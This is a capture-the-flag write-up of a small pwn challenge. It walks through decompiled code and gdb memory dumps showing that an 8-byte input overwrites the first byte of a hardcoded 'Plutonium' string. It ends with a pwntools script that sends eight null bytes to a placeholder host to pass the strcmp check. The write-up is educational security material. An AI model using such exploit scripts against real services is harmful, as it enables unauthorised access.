*Marty, I found a letter from someone in my pocket that says Time Travel is possible and provides the ingredients and a secret formula. The note is not 100% readable due to the time and I cannot fully understand the handwritting either. Please help me read the note and let's get to work creating this thing!*!

## Understanding the challenge

The challenge presents a randomly-coloured flask with a story, and asks for the missing ingredient:
![Menu](/assets/images/Formula/menu.png)
Behind the scenes, we can understand more about the code from Ghidraâ€™s decompiled version:

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_20 [7];
  undefined8 local_19;
  undefined local_11;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  story();
  local_19 = 0x75696e6f74756c50;
  local_11 = 0x6d;
  read(0,local_20,8);
  iVar1 = strcmp(local_20,(char *)&local_19);
  if (iVar1 == 0) {
    success();
  }
  else {
    fail();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```


In terms of security protections against exploitation, the binary has most of the checkboxes ticked:
![Checksec](/assets/images/Formula/checksec.png)
The challenge reads the ingredient from user input into the variable `local_20` (8 bytes), and compares it with the hardcoded ingredient Plutonium (9 bytes) - `0x75696e6f74756c50` and `0x6d`.

## Vulnerability identification

To locate the vulnerability, we need to examine the stack before the comparison which leads to `success()` is being made:

```asm
=> 0x555555400efd <main+92>:    call   0x555555400a00 <strcmp@plt>
   0x555555400f02 <main+97>:    test   eax,eax
   0x555555400f04 <main+99>:    jne    0x555555400f0d <main+108>
   0x555555400f06 <main+101>:   call   0x555555400b9a <success>
   0x555555400f0b <main+106>:   jmp    0x555555400f12 <main+113>
   0x555555400f0d <main+108>:   call   0x555555400c40 <fail>
   0x555555400f12 <main+113>:   mov    eax,0x0
   0x555555400f17 <main+118>:   mov    rcx,QWORD PTR [rbp-0x8]
```

According to the [Linux x64 calling convention](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame), the first two function parameters are accessed via the RDI and RSI registers:

```asm
// Plutonium (hardcoded)
gdb$ x/16b $rsi
0x7fffffffde0f: 0x50    0x6c    0x75    0x74    0x6f    0x6e    0x69    0x75
0x7fffffffde17: 0x6d    0x00    0x1b    0x6d    0x5b    0xc6    0x4c    0xe2

// Ingredient (user input - ABCD)
gdb$ x/16b $rdi
0x7fffffffde08: 0x41    0x42    0x43    0x44    0x0a    0x00    0x00    0x50
0x7fffffffde10: 0x6c    0x75    0x74    0x6f    0x6e    0x69    0x75    0x6d
0x7fffffffde18: 0x00

gdb$ x/s $rsi
0x7fffffffde0f: "Plutonium"

gdb$ x/s $rdi
0x7fffffffde08: "ABCD\n"
```

So we can read 8 bytes, and the 8th one will overwrite the first letter of the first letter of the hardcoded ingredient, `0x50` (**P**). 

## Exploitation

Even if not obvious straight away, the exploitation is actually quite easy. The only option to make the two strings equal is to *make them both `NULL`*, by sending 8 zeros as the secret ingredient.


```python
from pwn import *

conn = remote('<IP>', '<PORT>')

# Receive formula
print(conn.recvrepeat(2))

conn.send('\x00' * 8)
print(conn.recvrepeat(2))

conn.close()
```
